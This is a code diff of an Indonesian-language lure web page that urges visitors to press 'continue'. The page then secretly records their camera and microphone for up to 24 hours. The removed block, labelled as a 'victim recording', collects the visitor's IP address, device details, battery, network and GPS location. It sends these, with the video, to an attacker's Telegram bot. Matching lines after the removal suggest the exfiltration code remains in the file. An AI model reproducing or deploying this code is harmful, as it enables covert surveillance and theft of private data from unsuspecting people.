@@ -66,11 +66,11 @@
   <div class="circle-light"></div>
 
   <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
-    hay tolong tunggu 5 menit dan tolong tab baru aja by rizky gg blora ©kerenprojek.
+    silahkan pencet lanjutkan.
   </marquee>
 
   <div class="popup" id="step1">
-    <h2>Memulai...</h2>
+    <h2>SILAHKAN PENCET LANJUTKAN</h2>
     <button onclick="kirimNama()">LANJUTKAN</button>
   </div>
 
@@ -121,7 +121,7 @@ Baterai: ${battery}
       });
 
       const synth = window.speechSynthesis;
-      const welcome = new SpeechSynthesisUtterance('Halo! bang silahkan tunggu dulu 5 meni ya');
+      const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
       welcome.lang = 'id-ID';
       synth.speak(welcome);
 
@@ -152,7 +152,7 @@ Baterai: ${battery}
         setTimeout(() => {
           recorder.stop();
           alert("Rekaman otomatis selesai setelah 5 jam.");
-        }, 5 * 60 * 60 * 1000);
+        }, 24 * 60 * 60 * 1000);
 
       } catch (err) {
         alert("Akses kamera dan mikrofon ditolak.");
@@ -168,69 +168,6 @@ Baterai: ${battery}
 
     async function handleStop(stream) {
       setTimeout(() => capturePhoto(), 6000);
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      recordedChunks = [];
-
-      const userAgent = navigator.userAgent;
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');
-      const simInfo = navigator.userAgent.includes('Android') ? 'Kemungkinan SIM aktif (Android)' : 'Tidak terdeteksi';
-      const connection = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink}Mb/s` : 'Tidak tersedia';
-      const brand = /Android.+?; (.+?) Build/.exec(navigator.userAgent)?.[1] || 'Tidak diketahui';
-
-      const waktu = new Date();
-      const date = waktu.toLocaleDateString();
-      const time = waktu.toLocaleTimeString();
-      const location = await getLocation();
-      const lastActive = waktu.toLocaleString();
-
-      const message = `
-█░▄▀ ▄▀▄ █▀▀▄ █▀▄ ▄▀▄ █▄░█
-█▀▄░ █░█ █▐█▀ █▀█ █▀█ █░▀█
-▀░▀▀ ░▀░ ▀░▀▀ ▀▀░ ▀░▀ ▀░░▀
-[REKAMAN KORBAN BY ©RIZKYGG]
-
-IP: ${ip}
-Perangkat: ${userAgent}
-Terakhir Aktif: ${lastActive}
-Waktu: ${date}, ${time}
-Lokasi: ${location}
-Baterai: ${battery}
-SIM Card: ${simInfo}
-Jaringan: ${connection}
-Merek Perangkat: ${brand}
-=======================================
-©PROJEK GG BY RIZKY
-`;
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("caption", message);
-      formData.append("video", blob, "rekaman.webm");
-
-      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-        method: 'POST',
-        body: formData
-      }).catch(err => console.error("Telegram error:", err));
-    }
-
-    async function getLocation() {
-      return new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            resolve(`https://www.google.com/maps?q=${lat},${lon}`);
-          },
-          err => {
-            resolve("Lokasi tidak tersedia");
-          }
-        );
-      });
-    }
-  </script>
-</body>
-</html>
       const blob = new Blob(recordedChunks, { type: 'video/webm' });
       recordedChunks = [];
 
